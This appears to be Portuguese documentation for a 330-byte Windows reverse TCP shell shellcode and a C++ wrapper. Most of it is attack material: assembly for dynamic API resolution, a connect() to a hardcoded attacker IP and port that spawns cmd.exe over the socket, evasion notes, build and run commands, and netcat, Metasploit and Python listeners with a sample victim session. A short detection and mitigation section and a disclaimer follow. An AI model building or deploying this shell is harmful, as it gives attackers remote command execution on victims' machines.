Documentação Técnica - Windows Reverse TCP Shell
📋 Índice

Visão Geral
Arquitetura do Shellcode
Análise Detalhada
Melhorias Implementadas
Como Usar
Defesas e Detecção
Referências

🎯 Visão Geral
Propósito
Este shellcode implementa um reverse TCP shell para Windows x86/x64, que permite controle remoto de um sistema comprometido através de uma conexão TCP reversa.
Características Principais

Tamanho: 330 bytes (versão compacta)
Arquitetura: x86 (32-bit)
Plataforma: Windows XP/7/8/10/11
Protocolo: TCP/IP
Método: Resolução dinâmica de APIs

Diagrama de Fluxo

┌─────────────────┐
│  Início         │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ PEB Walking     │ ◄─── Localiza Kernel32.dll
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Export Table    │ ◄─── Encontra GetProcAddress
│ Parsing         │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ LoadLibraryA    │ ◄─── Carrega ws2_32.dll
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ WSAStartup      │ ◄─── Inicializa Winsock
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ WSASocketA      │ ◄─── Cria socket TCP
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ connect()       │ ◄─── Conecta ao C2
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ CreateProcessA  │ ◄─── Spawna cmd.exe
│ (cmd.exe)       │      com I/O redirecionado
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Shell Interativo│
└─────────────────┘


🏗️ Arquitetura do Shellcode
Fase 1: PEB Walking (Process Environment Block)


XOR ECX, ECX                    ; Zera ECX
MOV EAX, FS:[ecx + 0x30]        ; EAX = PEB (Thread Environment Block)
MOV EAX, [EAX + 0x0c]           ; EAX = PEB->Ldr (Loader Data)
MOV ESI, [EAX + 0x14]           ; ESI = InMemoryOrderModuleList


O que acontece:

Acessa o TEB (Thread Environment Block) via FS:[0x30]
Navega até a estrutura PEB (Process Environment Block)
Localiza a lista de módulos carregados
Itera até encontrar kernelbase.dll

Estruturas de Dados:

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;  // +0x0C
    // ...
} PEB, *PPEB;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;  // +0x14
    // ...
} PEB_LDR_DATA, *PPEB_LDR_DATA;

Fase 2: Export Table Parsing

MOV EBX, [EAX + 0x10]           ; EBX = Base address do módulo
MOV EDX, DWORD [EBX + 0x3C]     ; EDX = Offset do PE header
ADD EDX, EBX                    ; EDX = PE Header absoluto
MOV EDX, DWORD [EDX + 0x78]     ; EDX = Export Table RVA
ADD EDX, EBX                    ; EDX = Export Table absoluto

Estrutura PE (Portable Executable):


┌─────────────────────┐
│ DOS Header          │ ◄── Offset 0x00
│ DOS Stub            │
├─────────────────────┤
│ PE Signature        │ ◄── Offset 0x3C (e_lfanew)
│ File Header         │
│ Optional Header     │
├─────────────────────┤
│ Export Directory    │ ◄── Offset 0x78 do Optional Header
│  - AddressOfNames   │
│  - AddressOfOrdinals│
│  - AddressOfFunctions│
└─────────────────────┘

Fase 3: Resolução de GetProcAddress

GetFunction:
INC ECX                         ; Incrementa contador
LODSD                           ; Carrega offset do nome
ADD EAX, EBX                    ; EAX = nome absoluto
CMP dword [EAX], 0x50746547     ; Compara com "PteG"
JNZ SHORT GetFunction           ; Se não for, continua
CMP dword [EAX + 0x4], 0x41636F72   ; Compara com "rocA"
JNZ SHORT GetFunction
CMP dword [EAX + 0x8], 0x65726464   ; Compara com "ddre"
JNZ SHORT GetFunction

Por que "GetProcAddress"?

É uma função fundamental do Windows
Permite resolver qualquer outra função dinamicamente
Evita hardcoding de endereços (ASLR bypass)

Fase 4: Carregamento de APIs

; LoadLibraryA
PUSH 0x41797261                 ; "Ayra"
PUSH 0x7262694C                 ; "rbiL"
PUSH 0x64616F4C                 ; "daoL"
PUSH ESP                        ; Ponteiro para "LoadLibraryA"
PUSH EBX                        ; Handle do kernel32
CALL EDX                        ; GetProcAddress(kernel32, "LoadLibraryA")

APIs Necessárias:

LoadLibraryA - Carrega DLLs
WSAStartup - Inicializa Winsock
WSASocketA - Cria sockets
connect - Estabelece conexões
CreateProcessA - Spawna processos

Fase 5: Inicialização de Rede

; WSAStartup(MAKEWORD(2,2), &wsaData)
XOR EBX, EBX
MOV BX, 0x0190                  ; sizeof(WSADATA) = 400 bytes
SUB ESP, EBX                    ; Aloca espaço na stack
PUSH ESP                        ; Ponteiro para WSADATA
PUSH EBX                        ; Versão 2.2 (0x0202 little endian)
CALL EAX                        ; WSAStartup

Estrutura WSADATA:
ctypedef struct WSAData {
    WORD wVersion;              // Versão do Winsock
    WORD wHighVersion;
    char szDescription[257];
    char szSystemStatus[129];
    unsigned short iMaxSockets;
    unsigned short iMaxUdpDg;
    char FAR *lpVendorInfo;
} WSADATA;
Fase 6: Criação de Socket
assembly; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)
XOR ECX, ECX
PUSH EDX                        ; dwFlags = 0
PUSH EDX                        ; g = 0
PUSH EDX                        ; lpProtocolInfo = NULL
MOV DL, 0x6                     ; IPPROTO_TCP = 6
PUSH EDX
INC ECX                         ; SOCK_STREAM = 1
PUSH ECX
INC ECX                         ; AF_INET = 2
PUSH ECX
CALL EAX                        ; WSASocketA
Parâmetros:

AF_INET (2): IPv4
SOCK_STREAM (1): TCP
IPPROTO_TCP (6): Protocolo TCP

Fase 7: Conexão Reversa
assembly; connect(socket, &sockaddr, sizeof(sockaddr))
PUSH 0x0BC9A8C0                 ; IP: 192.168.201.11 (little endian)
PUSH word 0x5C11                ; Porta: 4444 (little endian)
XOR EBX, EBX
ADD BL, 0x2                     ; AF_INET = 2
PUSH word BX
MOV EDX, ESP                    ; Ponteiro para sockaddr
PUSH byte 16                    ; sizeof(sockaddr_in)
PUSH EDX
PUSH EBP                        ; Socket descriptor
CALL EAX                        ; connect()
Estrutura sockaddr_in:
cstruct sockaddr_in {
    short sin_family;           // AF_INET
    u_short sin_port;           // Porta (network byte order)
    struct in_addr sin_addr;    // IP (network byte order)
    char sin_zero[8];           // Padding
};
Fase 8: Spawn do Shell
assembly; CreateProcessA com I/O redirecionado
PUSH EDI                        ; hStdError = socket
PUSH EDI                        ; hStdOutput = socket
PUSH EDI                        ; hStdInput = socket
; ... STARTUPINFO setup ...
PUSH 0x00000100                 ; dwFlags = STARTF_USESTDHANDLES
; ... resto da estrutura ...
CALL EBP                        ; CreateProcessA("cmd.exe", ...)
STARTUPINFO:
ctypedef struct _STARTUPINFOA {
    DWORD cb;                   // Tamanho da estrutura
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX, dwY;
    DWORD dwXSize, dwYSize;
    DWORD dwXCountChars, dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;              // STARTF_USESTDHANDLES
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;           // ◄── Socket
    HANDLE hStdOutput;          // ◄── Socket
    HANDLE hStdError;           // ◄── Socket
} STARTUPINFOA;

🔍 Análise Detalhada
Técnicas de Evasão
1. Resolução Dinâmica de APIs
Vantagem:

Não aparece na Import Address Table (IAT)
Dificulta análise estática
Bypassa algumas ferramentas de detecção

Desvantagem:

Mais lenta que chamadas diretas
Padrão de PEB walking é detectável

2. String Obfuscation
assemblyPUSH 0x41797261     ; "Ayra" (invertido)
PUSH 0x7262694C     ; "rbiL"
PUSH 0x64616F4C     ; "daoL"
Por que invertido?

Little-endian: bytes são armazenados do menos significativo ao mais
"LoadLibrary" seria visível em análise de strings
Empilhando em ordem reversa, reconstrói a string corretamente

3. Tamanho Compacto
330 bytes permite:

Injeção em buffers pequenos
Transmissão rápida pela rede
Menor footprint em memória

Limitações e Vulnerabilidades
1. Sem Criptografia

Tráfego em texto claro
Facilmente detectável por IDS/IPS
Credenciais e comandos expostos

2. IP e Porta Hardcoded

Fácil de bloquear
Sem fallback/redundância
Sem capacidade de beacon

3. Sem Persistência

Encerra com o processo
Não sobrevive a reinicializações
Requer re-exploitação

4. Falta de Autenticação

Qualquer um pode conectar
Sem validação de cliente
Vulnerável a hijacking


⚡ Melhorias Implementadas
1. Classe Orientada a Objetos
cppclass ReverseShell {
private:
    ShellcodeConfig config;
    unsigned char* shellcode;
    void* execMemory;
    // ...
public:
    bool initialize();
    bool execute();
    void cleanup();
};
Benefícios:

Encapsulamento de estado
Gerenciamento automático de recursos (RAII)
Facilita extensibilidade

2. Validação de Ambiente
cppbool validateEnvironment() {
    // Verifica privilégios administrativos
    // Detecta DEP (Data Execution Prevention)
    // Valida sistema operacional
}
3. Tratamento de Erros Robusto
cpp__try {
    shellcodeFunc();
}
__except(EXCEPTION_EXECUTE_HANDLER) {
    std::cerr << "Código de exceção: " << GetExceptionCode();
}
4. Logging Detalhado

Hex dump do shellcode
Informações de alocação de memória
Status de cada fase
Códigos de erro do Windows

5. Configuração Dinâmica
cppshell.configure("10.0.0.5", 8080);  // IP e porta customizáveis
6. Patch Automático
cppvoid patchShellcode() {
    // Localiza e modifica IP
    // Localiza e modifica porta
    // Valida modificações
}

📖 Como Usar
Compilação
Visual Studio (Recomendado)
bashcl /EHsc /W4 reverse_shell.cpp /Fe:reverse_shell.exe
MinGW
bashg++ -std=c++11 -Wall reverse_shell.cpp -o reverse_shell.exe -lws2_32
Uso Básico
1. Configuração Padrão
bashreverse_shell.exe
Usa IP 192.168.201.11 e porta 4444.
2. Configuração Customizada
bashreverse_shell.exe 10.0.0.5 8080
Listener (Atacante)
Netcat
bashnc -lvnp 4444
Metasploit
bashuse exploit/multi/handler
set PAYLOAD windows/shell/reverse_tcp
set LHOST 192.168.201.11
set LPORT 4444
exploit
Python
pythonimport socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 4444))
s.listen(1)
print('[*] Aguardando conexão...')
conn, addr = s.accept()
print(f'[+] Conexão de {addr}')

while True:
    cmd = input('> ')
    conn.send(cmd.encode() + b'\n')
    data = conn.recv(4096)
    print(data.decode())
Exemplo de Sessão
[Atacante]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.100 49234

[Vítima] C:\Users\victim>whoami
desktop-abc123\victim

[Vítima] C:\Users\victim>ipconfig
Windows IP Configuration
Ethernet adapter Ethernet:
   IPv4 Address. . . . . . : 192.168.1.100
   Subnet Mask . . . . . . : 255.255.255.0
   Default Gateway . . . . : 192.168.1.1

🛡️ Defesas e Detecção
Detecção em Rede
1. Análise de Tráfego
Padrão suspeito:
- Conexões TCP saindo para IPs incomuns
- Transferência de comandos em texto claro
- Respostas de cmd.exe pela rede
Regra Snort:
snortalert tcp any any -> any any (
    msg:"Possível Reverse Shell - cmd.exe output";
    content:"C:\"; 
    content:">";
    flow:to_server,established;
    sid:1000001;
)
2. IDS/IPS

Detecta padrões de comando
Monitora processos spawning
Analisa syscalls suspeitas

Detecção em Host
1. Antivírus
Assinaturas:
- Shellcode patterns
- PEB walking behavior
- Dynamic API resolution
2. EDR (Endpoint Detection and Response)
Comportamentos monitorados:
- VirtualAlloc com PAGE_EXECUTE_READWRITE
- Processos injetando em outros processos
- cmd.exe com stdin/stdout redirecionado
3. Windows Defender ATP
powershell# Query para detectar
DeviceProcessEvents
| where ProcessCommandLine contains "cmd.exe"
| where InitiatingProcessCommandLine contains "VirtualAlloc"
Mitigações
1. DEP (Data Execution Prevention)
Impede execução de código em áreas de dados
Requer bypass via ROP chains
2. ASLR (Address Space Layout Randomization)
Randomiza endereços de DLLs
Dificulta hardcoding de offsets
3. CFG (Control Flow Guard)
Valida alvos de chamadas indiretas
Detecta alterações de fluxo anormais
4. Firewall de Aplicação
Bloqueia conexões saintes não autorizadas
Lista branca de processos com acesso à rede
5. Least Privilege
Executa aplicações com menores privilégios
Limita capacidade de escalar privilégios

📚 Referências
Documentação Oficial

Microsoft PE Format
Winsock API
Process Environment Block

Artigos Técnicos

"Understanding Windows Shellcode" - Corelan Team
"Windows x64 Shellcode Development" - SecurityTube
"PEB Walking Explained" - Exploit-DB

Ferramentas

Metasploit Framework
Cobalt Strike
msfvenom

Livros

"The Shellcoder's Handbook" - Chris Anley et al.
"Windows Internals" - Mark Russinovich
"Practical Malware Analysis" - Michael Sikorski


⚖️ Disclaimer
Este código é fornecido exclusivamente para:

Pesquisa acadêmica em segurança
Testes de penetração autorizados
Desenvolvimento de soluções de defesa
Educação em cibersegurança

PROIBIDO:

Uso contra sistemas sem autorização explícita
Distribuição para fins maliciosos
Modificação para evasão de defesas legítimas

O autor não se responsabiliza por uso indevido.

📝 Notas de Versão
Versão 2.0 (2026)

✅ Refatoração completa em C++
✅ Classe orientada a objetos
✅ Validação robusta de ambiente
✅ Logging detalhado
✅ Tratamento de exceções
✅ Configuração dinâmica
✅ Documentação completa

Versão 1.0 (2021)

Shellcode original de 330 bytes
Implementação básica em C


Última atualização: Janeiro 2026
Autor: Baseado em trabalho de Xenofon Vassilakopoulos
Licença: MIT (uso educacional)

